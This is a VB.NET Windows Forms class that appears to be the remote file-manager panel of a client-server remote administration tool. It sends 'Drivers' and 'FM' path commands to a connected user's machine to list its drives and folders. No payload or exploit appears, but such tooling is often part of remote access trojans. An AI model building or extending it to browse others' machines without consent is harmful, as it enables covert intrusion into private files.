Public Class Filemanager
    Public F As Form1
    Public U As USER


    Private Sub Filemanager_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        F.S.Send(U, "Drivers")
    End Sub

    Private Sub ListView1_DoubleClick(ByVal sender As Object, ByVal e As System.EventArgs) Handles ListView1.DoubleClick
        Try
            If ListView1.FocusedItem.ImageIndex = 0 Or ListView1.FocusedItem.ImageIndex = 1 Or ListView1.FocusedItem.ImageIndex = 2 Then
                If FULLPATH.Text.Length = 0 Then
                    FULLPATH.Text += ListView1.FocusedItem.Text
                Else
                    FULLPATH.Text += ListView1.FocusedItem.Text & "\"
                End If
                RefreshList()
            End If
        Catch ex As Exception

        End Try

    End Sub

    Public Sub RefreshList()
        F.S.Send(U, "FM" & F.SPL & FULLPATH.Text)
    End Sub

    Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles BackToolStripMenuItem.Click
        Try
            If FULLPATH.Text.Length < 4 Then
                FULLPATH.Text = ""
                F.S.Send(U, "Drivers" & F.SPL)
            Else
                FULLPATH.Text = FULLPATH.Text.Substring(0, FULLPATH.Text.LastIndexOf("\"))
                FULLPATH.Text = FULLPATH.Text.Substring(0, FULLPATH.Text.LastIndexOf("\") + 1)
                RefreshList()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem.Click
        RefreshList()
    End Sub

End Class